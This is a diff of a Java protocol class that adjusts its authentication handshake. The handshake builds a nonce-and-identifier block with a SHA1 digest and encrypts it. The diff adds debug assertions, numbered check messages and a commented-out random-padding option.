@@ -167,7 +167,7 @@ public class ZProtocol extends Protocol {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " Info: ***** Authentication *****"); //$NON-NLS-1$
 		}
-
+		
 		// key init
 		try {
 			cryptoConf.init(Keys.self().getChallengeKey());
@@ -175,6 +175,8 @@ public class ZProtocol extends Protocol {
 			random.nextBytes(Nonce);
 
 			final byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication());
+			if (Cfg.DEBUG) { Check.asserts(cypherOut.length % 16 == 0, " (authentication) Assert failed, not multiple of 16: " + cypherOut.length); }
+						
 			final byte[] response = transport.command(cypherOut);
 
 			return parseAuthentication(response);
@@ -405,6 +407,15 @@ public class ZProtocol extends Protocol {
 	protected byte[] forgeAuthentication() {
 		final Keys keys = Keys.self();
 
+
+		/*byte[] randBlock = new byte[]{};
+		if(Cfg.PROTOCOL_RANDBLOCK){
+			 // variabilita' di 5 blocchi pkcs5 da 16
+			randBlock = Utils.getRandomByteArray(0, 63+8);
+		}
+				 	
+		final byte[] data = new byte[104 + randBlock.length];*/
+		
 		final byte[] data = new byte[104];
 		final DataBuffer dataBuffer = new DataBuffer(data, 0, data.length);
 
@@ -413,16 +424,18 @@ public class ZProtocol extends Protocol {
 		dataBuffer.write(Nonce);
 
 		if (Cfg.DEBUG) {
-			Check.ensures(dataBuffer.getPosition() == 32, "forgeAuthentication, wrong array size"); //$NON-NLS-1$
+			Check.ensures(dataBuffer.getPosition() == 32, "forgeAuthentication 1, wrong array size"); //$NON-NLS-1$
 		}
 
 		dataBuffer.write(Utils.padByteArray(keys.getBuildId(), 16));
 		dataBuffer.write(keys.getInstanceId());
 		dataBuffer.write(Utils.padByteArray(keys.getSubtype(), 16));
-
+		
 		if (Cfg.DEBUG) {
-			Check.ensures(dataBuffer.getPosition() == 84, "forgeAuthentication, wrong array size"); //$NON-NLS-1$
+			Check.ensures(dataBuffer.getPosition() == 84, "forgeAuthentication 2, wrong array size"); //$NON-NLS-1$
 		}
+		
+		//dataBuffer.write(randBlock);
 
 		// calculating digest
 		final SHA1Digest digest = new SHA1Digest();
@@ -430,13 +443,16 @@ public class ZProtocol extends Protocol {
 		digest.update(keys.getInstanceId());
 		digest.update(Utils.padByteArray(keys.getSubtype(), 16));
 		digest.update(keys.getConfKey());
-
+		//digest.update(randBlock);
+				
 		final byte[] sha1 = digest.getDigest();
 
 		// appending digest
 		dataBuffer.write(sha1);
+		
+		
 		if (Cfg.DEBUG) {
-			Check.ensures(dataBuffer.getPosition() == data.length, "forgeAuthentication, wrong array size"); //$NON-NLS-1$
+			Check.ensures(dataBuffer.getPosition() == data.length, "forgeAuthentication 3, wrong array size"); //$NON-NLS-1$
 		}
 		return data;
 	}
